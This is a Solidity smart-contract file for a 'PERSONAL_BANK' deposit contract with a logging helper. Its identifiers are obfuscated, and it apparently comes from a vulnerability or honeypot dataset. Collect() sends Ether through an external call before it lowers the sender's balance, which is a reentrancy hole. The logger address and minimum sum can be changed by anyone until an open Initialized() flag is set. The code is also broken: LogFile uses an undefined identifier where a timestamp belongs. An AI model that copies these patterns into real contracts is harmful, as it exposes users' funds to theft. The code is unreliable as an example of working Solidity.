// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public _0x4a7bfc;

    uint public MinSum = 1 ether;

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool _0x6485be;

    function SetMinSum(uint _0x5c52fe)
    public
    {
        if(_0x6485be)revert();
        MinSum = _0x5c52fe;
    }

    function SetLogFile(address _0x47f5e7)
    public
    {
        if(_0x6485be)revert();
        Log = LogFile(_0x47f5e7);
    }

    function Initialized()
    public
    {
        _0x6485be = true;
    }

    function Deposit()
    public
    payable
    {
        _0x4a7bfc[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,"Put");
    }

    function Collect(uint _0x0e7257)
    public
    payable
    {
        if(_0x4a7bfc[msg.sender]>=MinSum && _0x4a7bfc[msg.sender]>=_0x0e7257)
        {
            if(msg.sender.call.value(_0x0e7257)())
            {
                _0x4a7bfc[msg.sender]-=_0x0e7257;
                Log.AddMessage(msg.sender,_0x0e7257,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        Deposit();
    }

}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x3e51ff,uint _0x5c52fe,string _0x49a6eb)
    public
    {
        LastMsg.Sender = _0x3e51ff;
        LastMsg.Time = _0xb98586;
        LastMsg.Val = _0x5c52fe;
        LastMsg.Data = _0x49a6eb;
        History.push(LastMsg);
    }
}